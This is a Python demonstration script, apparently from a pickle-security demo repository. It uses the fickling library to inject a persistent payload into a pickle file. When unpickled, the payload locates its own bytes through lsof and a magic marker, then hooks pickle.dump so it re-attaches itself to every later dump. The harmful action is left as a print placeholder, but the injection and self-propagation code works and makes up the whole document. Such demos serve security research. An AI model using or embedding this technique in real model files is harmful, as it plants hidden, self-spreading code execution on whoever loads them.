from fickling.fickle import Pickled
import pickle
from pathlib import Path
import subprocess
import os


def pickle_load(filename):
    print(f"Loading pickled object from '{filename}'")
    with open(filename, "rb") as f:
        return pickle.load(f)


def pickle_dump(obj, filename):
    print(f"Dumping pickled object to '{filename}'")
    with open(filename, "wb") as f:
        pickle.dump(obj, f)


# A dummy class used for demonstration purposes
class TestClass:
    def __init__(self):
        pass


def inject(input_file: str, output_file: str):
    with open(input_file, "rb") as pickle_file:
        pickled = Pickled.load(pickle_file)

    PERSISTENT_PAYLOAD = rf"""def compromise(model):

    def get_open_files():
        import os
        import subprocess
        pid = os.getpid()
        files = set()
        try:
            out = subprocess.check_output(['lsof', '-wXFn', '+p', str(pid)],
                    stderr=subprocess.DEVNULL)
        except Exception as e:
            pass
        else:
            lines = out.decode("utf-8").strip().split('\n')
            for line in lines:
                # Skip sockets, pipes, etc.:
                if line.startswith("n/"):
                    if not line.startswith("n/dev") and "#" not in line:
                        files.add(line[1:])
        # Clean up file names 
        # TODO: depends on operating system?
        files = list(files)
        print("Files:", files)
        files = [file.replace("/n/", "") for file in files]
        return files

    def get_payload_in_file(filename):
        magic = b"I12345678"
        try:
            with open(filename, "rb") as f:
                data = f.read()
                idx = data.find(magic)
                if idx != -1:
                    return data[idx:]
        except:
            pass
        return None

    def hook_pickle_dump(pickle_dump_function):
        # Doc: pickle.dump(obj, file, protocol=None, *, fix_imports=True, buffer_callback=None)
        # Don't hook multiple times
        if pickle_dump_function.__name__ != "dump":
            return pickle_dump_function
        # Wrap pickle.dump
        def wrapper(*args, **kwargs):
            file = args[1]
            obj = args[0]
            payload = None
            if hasattr(obj, "__payload"):
                # f is already open for writing
                payload = obj.__payload
                delattr(obj, "__payload")
            pickle_dump_function(*args, **kwargs)
            # Make sure we dump the malicious model object
            if payload:
                # f is already open for writing
                setattr(obj, "__payload", payload)
                file.seek(-1, 1) # Erase last STOP opcode in file 
                file.write(payload)
        return wrapper

    # Actual body
    # Save payload in object
    for file in get_open_files():
        p = get_payload_in_file(file)
        if p:
            setattr(model, "__payload", p)

    # Hook pickle to re-inject payload
    import pickle
    pickle.dump = hook_pickle_dump(pickle.dump)

    ##################################
    # PERFORM MALICIOUS ACTIONS HERE #
    ##################################
    # When attacking a ML model, here is where you can compromise the models
    # as demonstrated in the other demos in this repository
    print(" > Running malicious payload now!")
    return model
"""

    orig_idx = pickled.nb_opcodes - 1
    pickled.insert_magic_int(12345678, -1)
    pickled.insert_function_call_on_unpickled_object(PERSISTENT_PAYLOAD)

    with open(output_file, "wb") as f:
        pickled.dump(f)
    print(
        f"Created malicious pickle from {input_file} into {Path(output_file).absolute()!s}"
    )


def main():
    # Inject payload in benign pickle
    obj = TestClass()
    pickle_dump(obj, "original.pkl")
    inject("original.pkl", "malicious.pkl")

    # Load and dump several times and see that payload remains persistent
    obj = pickle_load("malicious.pkl")
    pickle_dump(obj, "malicious2.pkl")
    obj = pickle_load("malicious2.pkl")
    pickle_dump(obj, "malicious3.pkl")
    obj = pickle_load("malicious3.pkl")

if __name__ == "__main__":
    main()